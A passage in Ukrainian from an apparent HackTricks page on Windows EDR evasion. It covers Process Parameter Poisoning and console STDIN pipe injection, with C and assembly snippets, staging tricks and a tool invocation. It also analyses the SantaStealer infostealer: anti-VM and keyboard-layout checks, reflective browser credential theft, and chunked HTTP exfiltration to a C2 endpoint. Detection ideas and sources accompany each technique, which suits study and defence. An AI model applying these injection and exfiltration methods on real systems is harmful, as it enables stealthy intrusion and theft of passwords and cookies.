Ідеї для виявлення
- Віддалений запис у **виконувані сторінки, зіставлені з образом** (`MEM_IMAGE`, `PAGE_EXECUTE*`), а не в поширеніші приватні виділення RWX/RX.
- Точки входу експорту, байти яких у пам’яті більше не збігаються з відповідними байтами у файлі на диску.
- Віддалені потоки або перемикання контексту, виконання яких починається всередині експорту легітимної DLL, перші байти якого нещодавно змінено.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` для сторінок `.text` DLL із подальшим створенням потоку.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це техніка **ін’єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує той факт, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії даних, які можна отруїти й які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (із `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **доступну для запису пам’ять** для `CreateProcessW`; максимальний розмір — **32 767 символів Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовністю рядків `NAME=VALUE\0`, завершених додатковим `\0`.
- `lpReserved` офіційно зарезервовано, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою угодою.

Так звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із контрольованими зловмисником даними запуску, а Windows виконує копіювання між процесами.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою примітивів **лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Типовий ланцюжок P3:

1. Створити процес звичайним способом (не призупиняючи його)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, який уже повернуто в `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв thread hijacking, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через повернутий дескриптор головного потоку.

Це дає змогу уникнути кількох API, за якими часто стежать під час ін’єкції:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульового байта та staged shellcode

Усі три носії — це **рядкові або схожі на рядки дані**, тому під час передавання необроблене корисне навантаження, що містить `0x00`, обрізається. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу створювати рядки в стеку, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в переданий параметр.

### Виклики API зі стеку на першому етапі

Якщо першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтовий shadow space x64**
- задати для `RCX`, `RDX`, `R8`, `R9` константи або вказівники відносно `RSP`
- забезпечити **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку в ділянку `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і передати їй керування, уникаючи прямого виділення пам’яті RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- виклики `VirtualProtectEx` / `NtProtectVirtualMemory`, що надають **сторінкам параметрів процесу** право на виконання
- після такої зміни захисту — виклики `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією для `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк передавання даних між процесами**, а не повноцінний примітив виконання сам по собі: для скопійованого параметра все ще потрібна зміна прав доступу на виконання та спосіб перенаправлення виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від цього варіанта, оскільки він внутрішньо використовує підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## Console STDIN pipe injection

Інтерактивний дочірній процес із консоллю також можна використати як **примітив передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу на pipe і надсилає маркер, а за ним — shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому право на виконання та перенаправляє на нього потік дочірнього процесу. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно йдеться про process injection, а не про універсальний обхід EDR.<sup>[[41]](#references)</sup>

Попри опис як «named-pipe», у референсній реалізації викликається `CreatePipe`, який створює **анонімний pipe**. Windows реалізує анонімні pipe за допомогою внутрішніх об’єктів pipe з унікальними іменами, але PoC не вибирає шлях `\\.\pipe\<name>` і не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, розміщує дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес з увімкненим успадкуванням дескрипторів. Отже, цей PoC запускає вказану консольну програму, а не під’єднує свій pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Типовий процес

У реалізації використовується такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipe для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів на боці батьківського процесу та закрити копії дескрипторів на боці дочірнього процесу в батьківському процесі після створення процесу.
2. Запустити інтерактивний виконуваний файл, наприклад `netsh.exe` або `nslookup.exe`, з прапорцем `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` через дескриптор `STDIN` на боці батьківського процесу за допомогою `WriteFile`. Консольна програма зчитує байти й залишає їхню копію в одній зі своїх приватних виділених ділянок пам’яті.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, зчитати потенційні ділянки `MEM_PRIVATE` за допомогою `ReadProcessMemory` та знайти маркер на початку `rawData`.
5. Змінити захист знайденого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Знайти основний потік, призупинити його, задати для `RIP` значення `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його виконання.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудоване payload є x64 shellcode. `rawData` починається з маркера завдовжки 25 байтів, тому виконувані байти починаються зі шістнадцяткового зміщення `0x19`. Замінюючи payload, збережіть цю структуру або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до вихідного коду також зазначено, що `0x0A`, `0x0D` і `0x1A` є неприпустимими символами. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади невеликих нативних допоміжних програм і шаблонів компіляції payload див. у розділі [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Тактики SantaStealer для fileless-ухилення від виявлення та викрадення облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealer поєднують AV bypass, anti-analysis і доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealer-ів, щоб не активуватися в виключених регіонах, залишаючи при цьому артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A проходить списком процесів, хешує кожну назву за допомогою власної ковзної контрольної суми та порівнює її з вбудованими списками для debugger/sandbox; він повторно обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, наприклад `C:\analysis`.
- Варіант B перевіряє властивості системи (мінімальну кількість процесів, нещодавній час роботи), викликає `OpenServiceA("VBoxGuest")`, щоб виявити VirtualBox additions, і виконує перевірки часу навколо режиму сну для виявлення покрокового виконання. За будь-якого збігу виконання переривається до запуску модулів.

### Fileless-помічник + подвійне завантаження через ChaCha20 reflective loading

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або вручну відображається в пам’яті; у fileless-режимі імпорти та relocations обробляються самостійно, тож артефакти помічника не створюються.
- Цей помічник зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два ключі по 32 байти + 12-байтові nonce). Після обох проходів він завантажує blob через reflective loading (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing через direct-syscall, щоб впровадитися в активний браузер Chromium, успадкувати ключі AppBound Encryption і розшифрувати паролі/файли cookie/дані кредитних карток безпосередньо з баз даних SQLite попри захист ABE.

### Модульний збір у пам’яті та chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і запускає по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після приблизно 45-секундного очікування завершення.
- Після завершення всі дані архівуються за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 МБ через HTTP POST на `http://<C2>:6767/upload`, підробляючи межу браузерного `multipart/form-data` (`----WebKitFormBoundary***`). Кожна частина містить `User-Agent: upload`, `auth: <build_id>`, необов’язковий `w: <campaign_tag>`, а в останній частині додається `complete: true`, щоб C2 знав, що повторне збирання завершено.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library search order](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Process security and access rights](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Defeating Node.js Malware with API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: Putting Adaptix to Bed with Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET, and Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Hiding Your Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Abusing Chrome Remote Desktop On Red Team Operations A Practical Guide](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Weaponizing Defender's Remediation Driver as a Kernel Operation Primitive](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo companion code](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Crafting Self-Masking Functions Using LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole source](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe function](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Reforging C# Tools with WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Compiling C# / .NET Projects](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)

{{#include ../banners/hacktricks-training.md}}
